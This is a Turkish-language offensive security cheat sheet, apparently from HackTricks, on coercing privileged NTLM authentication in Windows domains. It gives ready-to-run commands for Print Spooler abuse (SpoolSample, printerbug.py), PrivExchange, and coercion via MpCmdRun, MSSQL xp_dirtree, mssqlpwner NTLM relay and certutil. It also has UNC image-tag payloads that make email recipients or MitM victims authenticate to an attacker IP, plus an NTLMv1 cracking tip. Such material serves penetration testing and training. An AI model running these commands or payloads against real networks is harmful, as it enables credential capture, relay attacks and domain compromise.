# NTLM Ayrıcalıklı Kimlik Doğrulamasını Zorla

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3. parti bağımlılıkları önlemek için MIDL derleyicisi kullanılarak C# ile kodlanmış **uzaktan kimlik doğrulama tetikleyicileri** **koleksiyonu**dur.

## Spooler Servisi İstismarı

Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistemle** **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ hizmetinin rastgele bir sistemle kimlik doğrulaması yapmasını sağlayabilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.

### Alan üzerindeki Windows Sunucularını Bulma

PowerShell kullanarak, Windows kutularının bir listesini alın. Sunucular genellikle önceliklidir, bu yüzden oraya odaklanalım:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler hizmetlerini dinleyenleri bulma

Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Hizmetinin dinleyip dinlemediğini kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Servisten rastgele bir ana bilgisayara kimlik doğrulaması yapmasını isteyin

[ **Buradan SpoolSample'ı**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** derleyebilirsiniz.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ve Linux'taysanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Sınırsız Delegasyon ile Birleştirme

Eğer bir saldırgan [Sınırsız Delegasyon](unconstrained-delegation.md) ile bir bilgisayarı zaten ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Sınırsız delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** sınırsız delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu ana bilgisayarı zaten ele geçirdiği için, **bu bileti alabilecek** ve bunu kötüye kullanabilecektir ([Bileti Geç](pass-the-ticket.md)).

## RCP Zorla Kimlik Doğrulama

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, Exchange sunucusunun, bir posta kutusuna sahip herhangi bir alan kullanıcısı tarafından HTTP üzerinden herhangi bir istemci sağlanan ana bilgisayara kimlik doğrulaması yapmaya zorlanmasını sağlar.

Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklar verilmiştir (özellikle, **2019 Öncesi Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıkları vardır**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ye iletim mümkün olmadığında bile, bu hata, alan içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.

## Windows İçinde

Eğer zaten Windows makinesinin içindeyseniz, Windows'u ayrıcalıklı hesaplarla bir sunucuya bağlanmaya zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft imzalı ikili) kullanarak NTLM kimlik doğrulamasını zorlamak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML enjeksiyonu

### E-posta ile

Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona **1x1 boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve açtığında, kimlik doğrulamaya çalışacaktır.

### MitM

Eğer bir bilgisayara MitM saldırısı gerçekleştirebilir ve onun görüntüleyeceği bir sayfaya HTML enjekte edebilirseniz, sayfaya aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 Kırma

Eğer [NTLMv1 zorluklarını yakalayabilirseniz, nasıl kırılacağını buradan okuyun](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;emember NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
